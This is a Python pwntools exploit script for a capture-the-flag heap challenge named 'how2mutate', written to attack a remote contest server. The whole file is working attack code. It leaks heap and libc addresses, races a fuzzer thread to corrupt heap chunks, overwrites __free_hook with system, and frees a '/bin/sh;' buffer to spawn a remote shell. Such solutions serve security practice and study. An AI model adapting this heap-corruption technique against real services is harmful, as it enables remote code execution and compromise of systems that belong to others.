from pwn import *
import binascii

#r = process("./how2mutate")
comp = 1

if comp:
    r = remote("111.186.59.27",12345)
    offset = 0x20
    sleep_time = 0
else:
    r = remote("172.17.0.2","4444")
    offset = 0x0
    sleep_time =  0
#

#0x557995638730,
# consider sending buffered input instead of doing sync for better race chances

#

buffer = ""

BUFFERING = 0
DONT_WAIT = 1
SYNC      = 2

MODE = SYNC

NEWLINE = "\n"
PADDING = "AAA"

def flush_bufffer():
    print("flushing buffer ; len %d" % len(buffer))
    global buffer
    r.send(buffer)
    buffer = ""

def pipe_wrapper(to_recv="", to_send=""):
    global buffer
    # maybe remove newlines?
    if MODE == SYNC:
        r.sendafter(to_recv,to_send)
    elif MODE == DONT_WAIT:
        r.send(to_send)
    else:
        buffer += to_send

def add_seed(seed):
    pipe_wrapper("> ","1"+PADDING)
    
    limit = 10
    pipe_wrapper("size: ",str(len(seed)) + NEWLINE) # newline for scanf
    if not len(seed):
        return
    pipe_wrapper("content: ",seed)


def mutate_seed(seed_index):
    pipe_wrapper("> ","2"+PADDING)
    pipe_wrapper("index: ",str(seed_index) + PADDING)


def show_seed():
    pipe_wrapper("> ","3"+PADDING)

def delete_seed(seed_index):
    pipe_wrapper("> ","4"+PADDING)
    pipe_wrapper("index: ",str(seed_index) + PADDING)

def set_mutate(mtsPerRun):
    pipe_wrapper("> ","5"+PADDING)
    pipe_wrapper("mutationsPerRun: ",str(mtsPerRun) +PADDING)

def spawn_fuzzer_thread():
    pipe_wrapper("> ","6"+PADDING)


def create_same_10_seeds(data):
    sizes = []
    seeds = []

    size = len(data)

    for i in range(10):
        sizes.append(size)
        seeds.append(data)
    
    return [sizes,seeds]



#payload = create_same_10_seeds("9" + ("A" * 0xf))
MODE=DONT_WAIT

set_mutate(0)

# setup log




for i in range(6):
    delete_seed(i)

add_seed("")
mutate_seed(0)


r.recvuntil("realloc(")
tmp = r.recvuntil(",")[2:-1]
print tmp
if len(tmp) % 2:
    tmp += "0"

heap = u64(binascii.unhexlify(tmp)[::-1].ljust(8,"\x00"))
log.info("heap @ " +hex(heap))

#MODE = DONT_WAIT


for i in range(4):
    add_seed("T" * 8)

add_seed("X" * (0xe0 + 0x20 + offset)) # padding
add_seed("A"*8) # fd = "0"


add_seed("") # victim @ 6

for i in range(4):
    delete_seed(i)

delete_seed(5) # delete prev chunk


#pause()
#MODE = DONT_WAIT
#for i in range(10):
#MODE = SYNC
MODE = BUFFERING


#for i in range(1):
spawn_fuzzer_thread()



#sleep(1) # race timing
sleep(sleep_time)
mutate_seed(6)

#flush_bufffer()

print("sleep!!!!")
sleep(0.1)

#pause()

#MODE = SYNC
seeds_ptr = heap - 0x90
#seeds_ptr = 0x8181818181
log.info("seeds @ "+hex(seeds_ptr))



add_seed("B"*0x20) # 0
flush_bufffer()

MODE= SYNC

#r.interactive()


add_seed("LEAK" * (0x420/4))
add_seed("LEAK" * (0x420/4))

#r.interactive()

#pause()

delete_seed(1)
#pause()
#r.interactive()

add_seed(p64(seeds_ptr)+p64(0x0)[:-1]) # 1
#flush_bufffer()
#pause()
add_seed("A"*0x8) # 2 << inside seeds



leak = heap + 0x558
#pause()
#leak = seeds_ptr
add_seed(p64(leak)) # 3 << inside seeds

#flush_bufffer()
#delete_seed(1)

#delete_seed(0)
show_seed()
#r.interactive()

show_seed()

r.recvuntil("0: ")
libc = u64(r.recvline().rstrip().ljust(8,"\x00"))

log.success("LIBC @ " +hex(libc) )

libc_base =  libc - 0x1ebbe0
system = libc_base + 0x55410
free_hook = libc_base + 0x1eeb28
binsh = libc_base + 0x1b75aa
log.success("LIBC BASE @ "+hex(libc_base))

dynfile = heap - 0x1100
dynfile_data = dynfile + 0x1050
log.info("dynfile @ "+hex(dynfile))
log.info("dynfile data @ "+hex(dynfile_data))

#pause()
delete_seed(5)
#pause()
# freed fake chunk
size = 0x7f
data = p64(dynfile) + p64(dynfile_data) + p64(free_hook)
data += "\x00" * (size - len(data))

add_seed(data)

delete_seed(0)
#r.interactive()
"""
fake_dynfile = "\x00" * 0x1050
fake_dynfile += p64(free_hook)
r.sendlineafter("> ","1")
r.sendlineafter(": ",str(len(fake_dynfile)))
r.recvuntil(":")
r.send(fake_dynfile[:0x400])
r.send(fake_dynfile[0x400:0x800])
r.send(fake_dynfile[0x800:0xc00])
r.send(fake_dynfile[0xc00:0x1000])
r.send(fake_dynfile[0x1000:])
"""
#add_seed(fake_dynfile)



add_seed(p64(0x01010101) * (0x400/8))
add_seed(p64(0x02020202) * (0x400/8))
add_seed(p64(0x03030303) * (0x400/8))
add_seed(p64(0x04040404) * (0x400/8))
add_seed(p64(0x05050505) * (0x508/8))
add_seed((p64(0x0060606) * (0x420/8) ) + p64(free_hook) )
#add_seed((p64(free_hook) * (0x100/8 ) ) + p64(free_hook) )

show_seed()

log.info("free hook @ "+hex(free_hook))
log.info("system @ "+hex(system))


#pause()
#r.interactive()



add_seed(p64(system) * 8)
mutate_seed(8)

#delete_seed(4)
add_seed("/bin/sh;"*0x10)

#r.interactive()

delete_seed(9)

#add_seed(p64(0xdeadbeef))

r.interactive()
